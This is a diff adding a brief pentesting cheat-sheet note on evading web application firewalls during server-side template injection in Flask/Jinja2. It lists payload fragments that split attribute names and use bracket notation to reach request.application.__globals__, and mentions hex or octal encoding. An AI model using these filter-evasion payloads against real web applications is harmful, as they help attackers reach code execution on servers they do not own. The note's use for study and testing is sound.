@@ -1,0 +1,23 @@
+##Bypassing filters if WAF.
+
+Remember that:
+
+request.__class__
+
+is equal to
+
+request["__class__"]
+
+That also is equal to 
+
+{{request['__cla'+'ss']}}
+
+And this also cna be combined in:
+
+{{request.application.__globals__}}
+
+is
+
+{{request['application']['__globa'+'ls__']
+
+Also, HEX or OCTAL encoding could be used
